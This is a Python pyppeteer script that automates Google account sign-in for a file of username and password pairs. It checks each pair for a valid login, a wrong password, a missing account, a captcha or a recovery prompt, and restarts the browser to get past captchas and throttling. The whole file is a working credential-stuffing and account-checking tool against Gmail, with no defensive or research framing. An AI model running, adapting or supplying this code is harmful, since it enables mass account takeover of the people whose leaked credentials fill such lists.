import asyncio
import time
from pyppeteer import launch
from pyppeteer.errors import ElementHandleError, NetworkError
from pyvirtualdisplay import Display
import sys
import nest_asyncio
import logging

nest_asyncio.apply()


async def gmailLogin(url, fileName, endFix):
    display = Display(visible=0, size=(800, 800))
    display.start()
    browser = await launch(
        options={
            'headless': False,
            'ignoreDefaultArgs': ['--enable-automation'],
            'args': ['--no-sandbox', '--disable-gpu'],
            # 'dumpio': True,
            # 'devtools': True,  # 打开 chromium 的 devtools与headless配个使用
            # 'args': [
            #     '--disable-extensions',
            #     '--hide-scrollbars',
            #     '--disable-bundled-ppapi-flash',
            #     '--mute-audio',
            #     '--no-sandbox',  # --no-sandbox 在 docker 里使用时需要加入的参数，不然会报错
            #     '--disable-setuid-sandbox',
            #     '--disable-gpu',
            # ],
            # 'dumpio': True,
        })
    context = await browser.createIncognitoBrowserContext()
    page = await context.newPage()
    file = open(fileName)
    line = file.readline()  # 调用文件的 readline()方法
    if line == None:
        return
    # strlist = fileName.split('-')
    # version = int(strlist[1]) + 1
    # nextFileName = strlist[0] + '-' + str(version)
    # print(nextFileName)
    # nextFile = open(nextFileName, 'w')
    lo = 1
    lastRes = -1
    while line:
        strlist = line.split('----')
        username = strlist[0] + endFix
        password = strlist[1].split('\n')[0]
        start = time.perf_counter()
        res = 1
        try:
            res = await test(page, username, password, url, lastRes)
            lastRes = res
            # await page.deleteCookie()
            # 登入到邮箱的情况
            if res == 7:
                await page.close()
                await context.close()
                await browser.close()
                browser = await launch(
                    options={
                        'headless': False,
                        'ignoreDefaultArgs': ['--enable-automation'],
                        'args': ['--no-sandbox', '--disable-gpu'],
                        'dumpio': True
                    })
                context = await browser.createIncognitoBrowserContext()
                page = await context.newPage()
        except Exception as e:
            logging.exception(e)
            print("error", username, password)
            try:
                await page.close()
                await context.close()
                await browser.close()
            except:
                print("reInit failed")
            browser = await launch(
                options={
                    'headless': False,
                    'ignoreDefaultArgs': ['--enable-automation'],
                    'args': ['--no-sandbox', '--disable-gpu'],
                    'dumpio': True
                })
            context = await browser.createIncognitoBrowserContext()
            page = await context.newPage()
        end = time.perf_counter()
        yongshi = end - start
        if (res == 3 and (yongshi > 4)) or res == 6:
            try:
                await page.close()
                await context.close()
                await browser.close()
            except:
                print("reInit failed")
            browser = await launch(
                options={
                    'headless': False,
                    'ignoreDefaultArgs': ['--enable-automation'],
                    'args': ['--no-sandbox', '--disable-gpu'],
                    'dumpio': True
                })
            context = await browser.createIncognitoBrowserContext()
            page = await context.newPage()
        print("total==============", yongshi)
        line = file.readline()
    file.close()
    await page.close()
    await context.close()
    await browser.close()


async def test(page, username, password, url, lastRes):
    # await page.goto(url, {'waitUntil': 'domcontentloaded'})
    # await page.type('#identifierId', username)
    if lastRes != 3:
        await page.goto(url, {'waitUntil': 'domcontentloaded'})
        await page.type('#identifierId', username)
    else:
        try:
            await page.evaluate("""
                                                           (username)=>{
                                                           document.getElementById("identifierId").value = username
                                                           }
                                                        """, username)
        except:
            await page.goto(url, {'waitUntil': 'domcontentloaded'})
            await page.type('#identifierId', username)
    # 点击下一步
    await page.click('#identifierNext')
    timeout = time.time() + 3
    flag = 1
    while (True):
        time.sleep(0.3)
        if time.time() > timeout:
            flag = 5
            break
        try:
            element = await page.querySelector(".o6cuMc")
            if element != None:
                flag = 4
                break
            element = await page.querySelector("#passwordNext")
            if element != None:
                flag = 2
                break
            element = await page.querySelector(".eLNT1d")
            if element == None:
                flag = 3
                break
        except:
            return 6
    if flag == 2:
        await page.type('#password input', password)
        await page.click('#passwordNext')
        flagone = 1
        while (True):
            try:
                # 密码错误
                element = await page.querySelector(".EjBTad")
                if element != None:
                    flagone = 2
                    break
                element = await page.querySelector(".o6cuMc")
                if element != None:
                    # 验证码
                    flagone = 3
                    break
                element = await page.querySelector("#passwordNext")
                if element != None:
                    await page.click('#passwordNext')
                    continue
                else:
                    break
            except:
                continue
        if flagone == 2:
            print("密码错误", username, "----", password)
            return 4
        elif flagone == 3:
            print("输入密码验证码", "----", password)
            return 5
        else:
            element = await page.querySelector(
                "img[src='https://ssl.gstatic.com/accounts/embedded/signin_tapyes.gif']")
            if element != None:
                print("success best", username, "----", password)
                return 1
            element = await page.querySelector(
                "img[src='https://ssl.gstatic.com/accounts/account-recovery-email-pin.gif']")
            if element != None:
                print("success 会将验证码发送到副邮箱", username, "----", password)
                return 1
            element = await page.querySelector(
                "path[d='M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 14H4V8l8 5 8-5v10zm-8-7L4 6h16l-8 5z']")
            if element != None:
                print("success 确定邮箱", username, "----", password)
                return 1
            element = await page.querySelector("#accountRecoveryButton")
            if element != None:
                print("success 账号需要恢复", username, "----", password)
                return 1
            element = await page.querySelector(
                "img[src='https://ssl.gstatic.com/accounts/account-recovery-sms-or-voice-pin.gif']")
            if element != None:
                print("success 电话页面", username, "----", password)
                return 1
            element = await page.querySelector("#knowledge-preregistered-email-response")
            if element != None:
                print("success 输入辅助邮箱地址", username, "----", password)
                return 1
            element = await page.querySelector("#phoneNumberId")
            if element != None:
                print("success 电话号码", username, "----", password)
                return 1
            element = await page.querySelector("#secret-question-response")
            if element != None:
                print("success 安全问题", username, "----", password)
                return 1
            element = await page.querySelector(".JDAKTe")
            if element != None:
                print("success 尝试以其他方式登录", username, "----", password)
                return 1
            element = await page.querySelector(".gb_Se")
            if element != None:
                print("success nice", username, "----", password)
                return 7
            print("success bestnum", username, "----", password)
    elif flag == 3:
        print("有验证码", username, "----", password)
        return 2
    elif flag == 4:
        print("账号不存在", username, "----", password)
        return 3
    else:
        print("时间过长", username, "----", password)
        return 8


if __name__ == '__main__':
    file = sys.argv[1]
    endFix = sys.argv[2]
    url = 'https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
    loop = asyncio.get_event_loop()
    loop.run_until_complete(gmailLogin(url, file, endFix))
